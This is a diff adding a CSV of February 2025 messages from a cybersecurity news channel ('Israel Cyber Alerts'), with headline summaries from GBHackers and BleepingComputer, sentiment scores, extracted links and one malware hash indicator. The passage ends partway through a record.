@@ -1,0 +1,1354 @@
+Sender ID,Date,Message,Sentiment,Compound_Sentiment,Channel Name,Affiliated Channel,URLs,IP_Addresses,Hashes
+478514542,2025-02-11 20:20:07,"Preventing Attackers from Permanently Deleting Entra ID Accounts with Protected Actions
+https://gbhackers.com/preventing-attackers-from-permanently-deleting-entra-id-accounts/
+
+Microsoft Entra ID has introduced a robust mechanism called protected actions to mitigate the risks associated with unauthorized hard deletions of user accounts. This feature, which integrates with Conditional Access policies, adds an additional layer of security to critical administrative tasks by requiring users to meet stringent authentication requirements before performing high-impact actions. Protected actions […]
+The post Preventing Attackers from Permanently Deleting Entra ID Accounts with Protected Actions (https://gbhackers.com/preventing-attackers-from-permanently-deleting-entra-id-accounts/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.13, 'neu': 0.65, 'pos': 0.22, 'compound': 0.8934}",0.8934,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-11 20:19:10,"Beyond the Horizon: Assessing the Viability of Single-Bit Fault Injection Attacks
+https://gbhackers.com/beyond-the-horizon-assessing-the-viability/
+
+The realm of fault injection attacks has long intrigued researchers and security professionals. Among these, single-bit fault injection, a technique that seeks to manipulate a single bit in a system, has often been considered elusive, akin to chasing a “unicorn.” Recent experiments, however, suggest that this precision may indeed be achievable under specific conditions, challenging […]
+The post Beyond the Horizon: Assessing the Viability of Single-Bit Fault Injection Attacks (https://gbhackers.com/beyond-the-horizon-assessing-the-viability/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.176, 'neu': 0.706, 'pos': 0.118, 'compound': -0.8176}",-0.8176,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-11 20:18:09,"Satellite Weather Software Vulnerabilities Let Attackers Execute Code Remotely
+https://gbhackers.com/satellite-weather-software-vulnerabilities/
+
+IBL Software Engineering has disclosed a significant security vulnerability, identified as CVE-2025-1077, affecting its Visual Weather software and derivative products, including Aero Weather, Satellite Weather, and NAMIS. This vulnerability allows remote, unauthenticated attackers to execute arbitrary Python code on affected servers, posing a severe risk of full system compromise. The issue resides in the Product […]
+The post Satellite Weather Software Vulnerabilities Let Attackers Execute Code Remotely (https://gbhackers.com/satellite-weather-software-vulnerabilities/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.215, 'neu': 0.638, 'pos': 0.148, 'compound': -0.8271}",-0.8271,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-11 17:32:34,"OpenAI Developing Its Own Chip to Reduce Reliance on Nvidia
+https://gbhackers.com/openai-developing-its-own-chip/
+
+OpenAI, the organization behind ChatGPT and other advanced AI tools, is making significant strides in its efforts to reduce its dependency on Nvidia by developing its first in-house artificial intelligence chip. According to the source, OpenAI is finalizing the design of its first-generation AI processor, which is expected to be sent for fabrication in the […]
+The post OpenAI Developing Its Own Chip to Reduce Reliance on Nvidia (https://gbhackers.com/openai-developing-its-own-chip/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.0, 'neu': 0.861, 'pos': 0.139, 'compound': 0.9001}",0.9001,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-11 17:31:36,"New York Bans DeepSeek Over Potential Data Risks
+https://gbhackers.com/new-york-bans-deepseek/
+
+ New York Governor Kathy Hochul announced that the state has banned the use of the China-based AI startup DeepSeek on government-issued devices and networks. The decision stems from escalating concerns over potential foreign surveillance and censorship risks associated with the app, which has recently gained meteoric popularity. Governor Hochul issued a statement addressing the ban, […]
+The post New York Bans DeepSeek Over Potential Data Risks (https://gbhackers.com/new-york-bans-deepseek/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.124, 'neu': 0.752, 'pos': 0.123, 'compound': -0.0258}",-0.0258,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-11 16:54:17,"Russian military hackers deploy malicious Windows activators in Ukraine
+https://www.bleepingcomputer.com/news/security/russian-military-hackers-deploy-malicious-windows-activators-in-ukraine/
+
+The Sandworm Russian military cyber-espionage group is targeting Windows users in Ukraine with trojanized Microsoft Key Management Service (KMS) activators and fake Windows updates. [...]","{'neg': 0.084, 'neu': 0.916, 'pos': 0.0, 'compound': -0.4767}",-0.4767,Israel Cyber Alerts,,https://www.bleepingcomputer.com,,
+478514542,2025-02-11 16:53:17,"SonicWall firewall exploit lets hackers hijack VPN sessions, patch now
+https://www.bleepingcomputer.com/news/security/sonicwall-firewall-exploit-lets-hackers-hijack-vpn-sessions-patch-now/
+
+Security researchers at Bishop Fox have published complete exploitation details for the CVE-2024-53704 vulnerability that allows bypassing the authentication mechanism in certain versions of the SonicOS SSLVPN application. [...]","{'neg': 0.075, 'neu': 0.621, 'pos': 0.303, 'compound': 0.8779}",0.8779,Israel Cyber Alerts,,https://www.bleepingcomputer.com,,
+478514542,2025-02-11 16:52:18,"US indicts 8Base ransomware operators for Phobos encryption attacks
+https://www.bleepingcomputer.com/news/security/us-indicts-8base-ransomware-operators-for-phobos-encryption-attacks/
+
+The U.S. Justice Department announced the names of two Phobos ransomware affiliates arrested yesterday in Thailand, charging them on 11 counts due to their involvement in more than a thousand cyberattacks. [...]","{'neg': 0.279, 'neu': 0.61, 'pos': 0.111, 'compound': -0.891}",-0.891,Israel Cyber Alerts,,https://www.bleepingcomputer.com,,
+478514542,2025-02-11 16:51:18,"US sanctions LockBit ransomware’s bulletproof hosting provider
+https://www.bleepingcomputer.com/news/security/us-sanctions-lockbit-ransomwares-bulletproof-hosting-provider/
+
+​The United States, Australia, and the United Kingdom have sanctioned Zservers, a Russia-based bulletproof hosting (BPH) services provider, for supplying essential attack infrastructure for the LockBit ransomware gang. [...]","{'neg': 0.175, 'neu': 0.702, 'pos': 0.123, 'compound': -0.5267}",-0.5267,Israel Cyber Alerts,,https://www.bleepingcomputer.com,,
+478514542,2025-02-11 12:15:51,"Hackers Exploit Valentine’s Day Domains for Sneaky Cyber Attacks
+https://gbhackers.com/hackers-exploit-valentines-day-domains/
+
+Cybercriminals are capitalizing on the season of love to launch sneaky and deceptive cyberattacks. According to the whoisxmlapi shared on the X, there has been a surge in the registration of Valentine’s Day-themed domains, many of which are likely being used to perpetrate phishing schemes and online fraud. Valentine’s Day is a time when individuals […]
+The post Hackers Exploit Valentine’s Day Domains for Sneaky Cyber Attacks (https://gbhackers.com/hackers-exploit-valentines-day-domains/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.235, 'neu': 0.647, 'pos': 0.118, 'compound': -0.9274}",-0.9274,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-11 12:14:51,"EARLYCROW: Detecting APT Malware Command and Control Activities Over HTTPS
+https://gbhackers.com/earlycrow-detecting-apt-malware-command-and-control/
+
+Advanced Persistent Threats (APTs) represent a sophisticated and stealthy category of cyberattacks targeting critical organizations globally. Unlike common malware, APTs employ evasive tactics, techniques, and procedures (TTPs) to remain undetected for extended periods. Their command-and-control (C&C) communications often mimic legitimate web traffic, making detection particularly challenging for traditional Network Intrusion Detection Systems (NIDS). To address […]
+The post EARLYCROW: Detecting APT Malware Command and Control Activities Over HTTPS (https://gbhackers.com/earlycrow-detecting-apt-malware-command-and-control/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.161, 'neu': 0.709, 'pos': 0.129, 'compound': -0.6815}",-0.6815,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-11 12:13:52,"Enhanced IllusionCAPTCHA: Advanced Protection Against AI-Powered CAPTCHA Attacks
+https://gbhackers.com/enhanced-illusioncaptcha-advanced-protection/
+
+As AI technologies continue to evolve, traditional CAPTCHA systems face increasing vulnerabilities. Recent studies reveal that advanced AI models, such as multimodal large language models (LLMs), can bypass many existing CAPTCHA mechanisms with alarming efficiency. To address this challenge, researchers have introduced IllusionCAPTCHA, a groundbreaking system leveraging visual illusions to create tasks that are intuitive […]
+The post Enhanced IllusionCAPTCHA: Advanced Protection Against AI-Powered CAPTCHA Attacks (https://gbhackers.com/enhanced-illusioncaptcha-advanced-protection/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.086, 'neu': 0.728, 'pos': 0.185, 'compound': 0.8006}",0.8006,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-11 12:12:51,"Akira Ransomware Dominates January 2025 as the Most Active Ransomware Threat
+https://gbhackers.com/akira-ransomware-dominates-january-2025/
+
+January 2025 marked a pivotal month in the ransomware landscape, with Akira emerging as the most active and dominant threat actor. The group was responsible for 72 attacks globally, a 60% surge compared to previous months, underscoring its aggressive expansion and technical sophistication. Akira’s rise is emblematic of the broader evolution of ransomware operations, characterized […]
+The post Akira Ransomware Dominates January 2025 as the Most Active Ransomware Threat (https://gbhackers.com/akira-ransomware-dominates-january-2025/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.319, 'neu': 0.53, 'pos': 0.151, 'compound': -0.9838}",-0.9838,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-11 12:11:53,"SolarWinds Improves Web Help Desk in Latest 12.8.5 Update
+https://gbhackers.com/solarwinds-improves-web-help-desk/
+
+SolarWinds announced the release of Web Help Desk (WHD) version 12.8.5, unveiling a host of new features, updates, and fixes aimed at streamlining IT service management and enhancing security. The update brings significant enhancements to the Purchase Order (PO) section, database communication, and overall usability. Web Desk Help Key Features and Updates 1. Improved Purchase Order […]
+The post SolarWinds Improves Web Help Desk in Latest 12.8.5 Update (https://gbhackers.com/solarwinds-improves-web-help-desk/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.0, 'neu': 0.722, 'pos': 0.278, 'compound': 0.9786}",0.9786,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-11 10:37:23,"Gcore Radar Report Reveals 56% Year-on-year Increase in DDoS Attacks
+https://gbhackers.com/gcore-radar-report-reveals-56-year-on-year/
+
+Gcore, the global provider of edge AI, cloud, network, and security solutions has released its Q3-Q4 2024 Radar report on DDoS attack trends. The findings highlight a dramatic surge in the scale and impact of DDoS attacks, which have reached unprecedented levels this year. Businesses must take swift action to safeguard against this growing threat. […]
+The post Gcore Radar Report Reveals 56% Year-on-year Increase in DDoS Attacks (https://gbhackers.com/gcore-radar-report-reveals-56-year-on-year/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.128, 'neu': 0.652, 'pos': 0.22, 'compound': 0.6808}",0.6808,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-11 07:26:18,"Critical Flaw in Progress LoadMaster Allows Attackers to Execute System Commands
+https://gbhackers.com/critical-flaw-in-progress-loadmaster/
+
+ A series of critical security vulnerabilities have been identified in Progress Software’s LoadMaster application, potentially allowing remote attackers to execute system commands or access sensitive files. CVE-2024-56131, CVE-2024-56132, CVE-2024-56133, CVE-2024-56134, and CVE-2024-56135, affect all current versions of LoadMaster, including Multi-Tenant LoadMaster (MT) deployments, prompting an urgent patch advisory for users. Progress Software has confirmed that no active exploits of these […]
+The post Critical Flaw in Progress LoadMaster Allows Attackers to Execute System Commands (https://gbhackers.com/critical-flaw-in-progress-loadmaster/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.185, 'neu': 0.603, 'pos': 0.212, 'compound': 0.3818}",0.3818,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-11 07:25:18,"Authorities Seize 8Base Ransomware Dark Web Site, Arrest Four Key Operators
+https://gbhackers.com/authorities-seize-8base-ransomware-dark-web-site/
+
+Thai authorities arrested four European hackers in Phuket on February 10, 2025, for their alleged involvement in ransomware operations that inflicted global losses exceeding $16 million. The arrests, part of the multinational “Operation PHOBOS AETOR,” were executed in collaboration with Swiss and U.S. law enforcement agencies. The suspects, two men, and two women were apprehended […]
+The post Authorities Seize 8Base Ransomware Dark Web Site, Arrest Four Key Operators (https://gbhackers.com/authorities-seize-8base-ransomware-dark-web-site/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.255, 'neu': 0.686, 'pos': 0.059, 'compound': -0.9771}",-0.9771,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-11 07:24:19,"12,000+ KerioControl Firewalls Exposed to 1-Click RCE Attack
+https://gbhackers.com/12000-keriocontrol-firewalls-exposed/
+
+Cybersecurity researchers caution that over 12,000 instances of GFI KerioControl firewalls remain unpatched and vulnerable to a critical security flaw (CVE-2024-52875) that could be exploited for remote code execution (RCE) with minimal effort. The Shadowserver Foundation has been tracking this vulnerability and issuing daily reports since February 5, 2025. Critical Vulnerability Overview CVE-2024-52875 is a […]
+The post 12,000+ KerioControl Firewalls Exposed to 1-Click RCE Attack (https://gbhackers.com/12000-keriocontrol-firewalls-exposed/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.17, 'neu': 0.684, 'pos': 0.146, 'compound': -0.128}",-0.128,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-11 03:14:42,"Apple iOS 0-day Vulnerability Exploited Wild in Extremely Sophisticated Attack
+https://gbhackers.com/apple-ios-0-day-vulnerability-exploited/
+
+Apple has released emergency security updates to address a zero-day vulnerability, CVE-2025-24200, that has been actively exploited in targeted attacks against iPhone and iPad users. The vulnerability allows attackers to disable USB Restricted Mode on a locked device, potentially granting unauthorized access to sensitive data. Apple is aware of reports that this issue may have […]
+The post Apple iOS 0-day Vulnerability Exploited Wild in Extremely Sophisticated Attack (https://gbhackers.com/apple-ios-0-day-vulnerability-exploited/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.24, 'neu': 0.512, 'pos': 0.248, 'compound': -0.2193}",-0.2193,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-11 00:49:38,"Over 12,000 KerioControl firewalls exposed to exploited RCE flaw
+https://www.bleepingcomputer.com/news/security/over-12-000-keriocontrol-firewalls-exposed-to-exploited-rce-flaw/
+
+Over twelve thousand GFI KerioControl firewall instances are exposed to a critical remote code execution vulnerability tracked as CVE-2024-52875. [...]","{'neg': 0.214, 'neu': 0.623, 'pos': 0.163, 'compound': 0.0258}",0.0258,Israel Cyber Alerts,,https://www.bleepingcomputer.com,,
+478514542,2025-02-10 23:13:57,"Apple fixes zero-day exploited in 'extremely sophisticated' attacks
+https://www.bleepingcomputer.com/news/apple/apple-fixes-zero-day-exploited-in-extremely-sophisticated-attacks/
+
+Apple has released emergency security updates to patch a zero-day vulnerability that the company says was exploited in targeted and ""extremely sophisticated"" attacks. [...]","{'neg': 0.411, 'neu': 0.329, 'pos': 0.26, 'compound': -0.8799}",-0.8799,Israel Cyber Alerts,,https://www.bleepingcomputer.com,,
+478514542,2025-02-10 20:13:15,"Quishing via QR Codes Emerging as a Top Attack Vector Used by Hackers
+https://gbhackers.com/quishing-via-qr-codes-emerging-as-a-top-attack-vector/
+
+QR codes, once a symbol of convenience and security in digital interactions, have become a significant target for cybercriminals. The Rise of Fake QR Code Scams A new form of cyberattack, dubbed “quishing,” involves the use of counterfeit QR codes to deceive users into visiting fraudulent websites, downloading malware, or surrendering sensitive information. This emerging […]
+The post Quishing via QR Codes Emerging as a Top Attack Vector Used by Hackers (https://gbhackers.com/quishing-via-qr-codes-emerging-as-a-top-attack-vector/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.194, 'neu': 0.682, 'pos': 0.124, 'compound': -0.9062}",-0.9062,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-10 20:12:16,"New ‘BYOTB’ Attack Exploits Trusted Binaries to Evade Detection, Researchers Reveal
+https://gbhackers.com/new-byotb-attack-exploits-trusted-binaries-to-evade-detection/
+
+A recent cybersecurity presentation at BSides London 2024 has unveiled a sophisticated attack technique known as Bring Your Own Trusted Binary (BYOTB). This method leverages legitimate, trusted binaries to evade detection by advanced security measures such as Endpoint Detection and Response (EDR) systems and firewalls. The findings, presented by cybersecurity researcher David Kennedy of Jumpsec […]
+The post New ‘BYOTB’ Attack Exploits Trusted Binaries to Evade Detection, Researchers Reveal (https://gbhackers.com/new-byotb-attack-exploits-trusted-binaries-to-evade-detection/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.116, 'neu': 0.656, 'pos': 0.228, 'compound': 0.9062}",0.9062,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-10 20:11:15,"SAML Bypass Authentication on GitHub Enterprise Servers to Login as Other User Account
+https://gbhackers.com/saml-bypass-authentication-on-github-enterprise-servers/
+
+A severe security vulnerability, tracked as CVE-2025-23369, has been identified in GitHub Enterprise Server (GHES), allowing attackers to bypass SAML authentication and impersonate other user accounts. This flaw exploits quirks in the libxml2 library used during SAML response validation, enabling unauthorized access to accounts, including those with administrative privileges. The vulnerability arises from improper handling […]
+The post SAML Bypass Authentication on GitHub Enterprise Servers to Login as Other User Account (https://gbhackers.com/saml-bypass-authentication-on-github-enterprise-servers/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.072, 'neu': 0.706, 'pos': 0.222, 'compound': 0.9432}",0.9432,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-10 20:10:18,"NanoCore RAT Attack Windows Using Task Scheduler to Captures keystrokes, screenshots
+https://gbhackers.com/nanocore-rat-attack-windows-using-task-scheduler/
+
+NanoCore, a notorious Remote Access Trojan (RAT), continues to pose a significant threat to Windows systems. This malware, known for its espionage capabilities and modular design, is being leveraged by cybercriminals to exfiltrate sensitive data, control infected systems, and maintain persistence using advanced techniques. A recent analysis of a NanoCore sample (MD5 hash: 18B476D37244CB0B435D7B06912E9193) sheds […]
+The post NanoCore RAT Attack Windows Using Task Scheduler to Captures keystrokes, screenshots (https://gbhackers.com/nanocore-rat-attack-windows-using-task-scheduler/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.174, 'neu': 0.727, 'pos': 0.099, 'compound': -0.8807}",-0.8807,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,18B476D37244CB0B435D7B06912E9193
+478514542,2025-02-10 20:09:16,"Hackers Exploiting Google Tag Managers to Steal Credit Card from eCommerce Sites
+https://gbhackers.com/hackers-exploiting-google-tag-managers-to-steal-credit-card/
+
+In a concerning development, cybercriminals are leveraging Google Tag Manager (GTM), a legitimate tool widely used by eCommerce websites, to deploy malicious scripts designed to steal credit card information. This attack vector, often referred to as Magecart or e-skimming, has been observed targeting platforms like Magento, WordPress, and OpenCart, among others. The abuse of GTM […]
+The post Hackers Exploiting Google Tag Managers to Steal Credit Card from eCommerce Sites (https://gbhackers.com/hackers-exploiting-google-tag-managers-to-steal-credit-card/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.187, 'neu': 0.669, 'pos': 0.144, 'compound': -0.802}",-0.802,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-10 18:57:53,"Hacker pleads guilty to SIM swap attack on US SEC X account
+https://www.bleepingcomputer.com/news/security/hacker-pleads-guilty-to-sim-swap-attack-on-us-sec-x-account/
+
+Today, an Alabama man pleaded guilty to hijacking the U.S. Securities and Exchange Commission (SEC) account on X in a January 2024 SIM swapping attack. [...]","{'neg': 0.259, 'neu': 0.692, 'pos': 0.049, 'compound': -0.8555}",-0.8555,Israel Cyber Alerts,,https://www.bleepingcomputer.com,,
+478514542,2025-02-10 18:56:53,"Police arrests 4 Phobos ransomware suspects, seizes 8Base sites
+https://www.bleepingcomputer.com/news/legal/police-arrests-4-phobos-ransomware-suspects-seizes-8base-sites/
+
+A global law enforcement operation targeting the Phobos ransomware gang has led to the arrest of four suspected hackers in Phuket, Thailand, and the seizure of 8Base's dark web sites. The suspects are accused of conducting cyberattacks on over 1,000 victims worldwide. [...]","{'neg': 0.387, 'neu': 0.613, 'pos': 0.0, 'compound': -0.9764}",-0.9764,Israel Cyber Alerts,,https://www.bleepingcomputer.com,,
+478514542,2025-02-10 10:20:43,"Penetration Testers Arrested During Approved Physical Penetration Testing
+https://gbhackers.com/penetration-testers-arrested-during-approved-physical-penetration-testing/
+
+A routine physical penetration test conducted by cybersecurity professionals took an unexpected turn when armed police officers arrested two security experts during a simulated breach of a corporate office in Malta. Physical penetration testing is a critical component of cybersecurity assessments. It evaluates not only technical defenses but also physical access controls and human response […]
+The post Penetration Testers Arrested During Approved Physical Penetration Testing (https://gbhackers.com/penetration-testers-arrested-during-approved-physical-penetration-testing/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.137, 'neu': 0.706, 'pos': 0.157, 'compound': 0.4751}",0.4751,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-10 10:19:43,"Cisco Data Breach – Ransomware Group Allegedly Breached Internal Network
+https://gbhackers.com/cisco-data-breach-internal-network-compromised/
+
+Sensitive credentials from Cisco’s internal network and domain infrastructure were reportedly made public due to a significant data breach. According to a Cyber Press Research report, the new Kraken ransomware group has allegedly leaked a dataset on their dark web blog, which appears to be a dump of hashed passwords from a Windows Active Directory […]
+The post Cisco Data Breach – Ransomware Group Allegedly Breached Internal Network (https://gbhackers.com/cisco-data-breach-internal-network-compromised/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.292, 'neu': 0.611, 'pos': 0.097, 'compound': -0.9823}",-0.9823,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-10 10:18:44,"Linux Kernel 6.14-rc2 Released – What’s Newly Added !
+https://gbhackers.com/linux-kernel-6-14-rc2-released/
+
+Linus Torvalds, lead developer of the Linux kernel, announced the second release candidate (rc2) of Linux Kernel 6.14, providing developers and enthusiasts with a glimpse at the latest updates and fixes in the kernel’s development cycle. The announcement was made on the Linux Kernel Mailing List (LKML) on Sunday, February 9, 2025. This release follows […]
+The post Linux Kernel 6.14-rc2 Released – What’s Newly Added ! (https://gbhackers.com/linux-kernel-6-14-rc2-released/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.0, 'neu': 0.89, 'pos': 0.11, 'compound': 0.8436}",0.8436,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-10 10:17:45,"Critical Zimbra Flaws Allow Attackers to Gain Unauthorized Access to Sensitive Data
+https://gbhackers.com/critical-zimbra-flaws/
+
+Serious vulnerabilities in Zimbra Collaboration Suite (ZCS), a popular enterprise email and collaboration platform, have raised alarm in the cybersecurity community. Security researchers have identified several critical flaws that allow attackers to access sensitive data and compromise user accounts. With millions of businesses relying on Zimbra for email services, these vulnerabilities pose significant risks. Key […]
+The post Critical Zimbra Flaws Allow Attackers to Gain Unauthorized Access to Sensitive Data (https://gbhackers.com/critical-zimbra-flaws/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.238, 'neu': 0.561, 'pos': 0.201, 'compound': -0.7003}",-0.7003,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-10 08:53:07,"A Cybersecurity Leader’s Guide to SecVal in 2025
+https://www.bleepingcomputer.com/news/security/a-cybersecurity-leaders-guide-to-secval-in-2025/
+
+Are your defenses truly battle-tested? Security validation ensures you're not just hoping your security works—it proves it. Learn more from Pentera on how to validate against ransomware, credential threats, and unpatched vulnerabilities in the GOAT Guide. [...]","{'neg': 0.199, 'neu': 0.612, 'pos': 0.189, 'compound': -0.3883}",-0.3883,Israel Cyber Alerts,,https://www.bleepingcomputer.com,,
+478514542,2025-02-10 07:44:17,"Tor Browser 14.0.6 Released, What’s New!
+https://gbhackers.com/tor-browser-14-0-6-released/
+
+The Tor Project has officially unveiled Tor Browser 14.0.6, now accessible for download from the Tor Browser download page and its distribution directory. The latest update introduces critical fixes and enhancements, ensuring a smoother and more secure browsing experience for users. Here’s a detailed look at what’s new in this release. Key Updates in Tor Browser 14.0.6 The standout […]
+The post Tor Browser 14.0.6 Released, What’s New! (https://gbhackers.com/tor-browser-14-0-6-released/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.024, 'neu': 0.832, 'pos': 0.145, 'compound': 0.8951}",0.8951,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-10 07:43:20,"Hackers Exploit AnyDesk Vulnerability to Gain Admin Access – PoC Released
+https://gbhackers.com/hackers-exploit-anydesk-vulnerability/
+
+A newly discovered vulnerability in AnyDesk, the popular remote desktop software, has sparked serious cybersecurity concerns. Identified as CVE-2024-12754 and tracked under ZDI-24-1711, this flaw allows local attackers to exploit a mechanism to handle Windows background images, potentially escalating their privileges to administrative levels. Researchers warn that this vulnerability poses a significant risk to sensitive […]
+The post Hackers Exploit AnyDesk Vulnerability to Gain Admin Access – PoC Released (https://gbhackers.com/hackers-exploit-anydesk-vulnerability/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.165, 'neu': 0.57, 'pos': 0.266, 'compound': 0.891}",0.891,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-08 12:37:23,"UK Pressures Apple to Create Global Backdoor To Spy on Encrypted iCloud Access
+https://gbhackers.com/uk-demands-apple-create-global-backdoor/
+
+United Kingdom has reportedly ordered Apple to create a backdoor allowing access to all encrypted content stored in its iCloud service. The demand, issued under the U.K.’s controversial Investigatory Powers Act of 2016, has raised alarm among privacy advocates and tech experts. If implemented, this order would allow British authorities to bypass encryption protections not […]
+The post UK Pressures Apple to Create Global Backdoor To Spy on Encrypted iCloud Access (https://gbhackers.com/uk-demands-apple-create-global-backdoor/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.179, 'neu': 0.651, 'pos': 0.17, 'compound': -0.4939}",-0.4939,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-07 20:50:03,"Autonomous LLMs Reshaping Pen Testing: Real-World AD Breaches and the Future of Cybersecurity
+https://gbhackers.com/real-world-ad-breaches-and-the-future-of-cybersecurity/
+
+Large Language Models (LLMs) are transforming penetration testing (pen testing), leveraging their advanced reasoning and automation capabilities to simulate sophisticated cyberattacks. Recent research demonstrates how autonomous LLM-driven systems can effectively perform assumed breach simulations in enterprise environments, particularly targeting Microsoft Active Directory (AD) networks. These advancements mark a significant departure from traditional pen testing methods, […]
+The post Autonomous LLMs Reshaping Pen Testing: Real-World AD Breaches and the Future of Cybersecurity (https://gbhackers.com/real-world-ad-breaches-and-the-future-of-cybersecurity/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.044, 'neu': 0.778, 'pos': 0.178, 'compound': 0.9074}",0.9074,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-07 20:49:00,"Securing GAI-Driven Semantic Communications: A Novel Defense Against Backdoor Attacks
+https://gbhackers.com/a-novel-defense-against-backdoor-attacks/
+
+Semantic communication systems, powered by Generative AI (GAI), are transforming the way information is transmitted by focusing on the meaning of data rather than raw content. Unlike traditional communication methods, these systems encode semantic features such as text, images, or speech into low-dimensional vectors, significantly reducing bandwidth usage while maintaining the integrity of transmitted information. […]
+The post Securing GAI-Driven Semantic Communications: A Novel Defense Against Backdoor Attacks (https://gbhackers.com/a-novel-defense-against-backdoor-attacks/) appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform (https://gbhackers.com/).","{'neg': 0.119, 'neu': 0.666, 'pos': 0.215, 'compound': 0.7964}",0.7964,Israel Cyber Alerts,,"https://gbhackers.com,https://gbhackers.com,https://gbhackers.com",,
+478514542,2025-02-07 20:48:02,"Cybercriminals Target IIS Servers to Spread BadIIS Malware
+https://gbhackers.com/cybercriminals-target-iis-servers/
+
